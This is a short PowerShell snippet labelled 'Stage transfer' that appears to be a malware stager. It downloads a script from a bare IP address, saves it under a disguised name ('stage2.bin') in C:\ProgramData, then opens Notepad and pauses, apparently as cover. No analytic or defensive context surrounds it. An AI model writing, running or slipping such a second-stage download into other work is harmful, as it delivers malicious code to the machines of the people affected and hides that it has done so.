
<# Stage transfer #> $TargetUrl = 'http://203.0.113.143/updater.ps1'; $LocalPath = 'C:\ProgramData\stage2.bin'; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath); Start-Process -FilePath 'notepad.exe'; Start-Sleep -Seconds 6
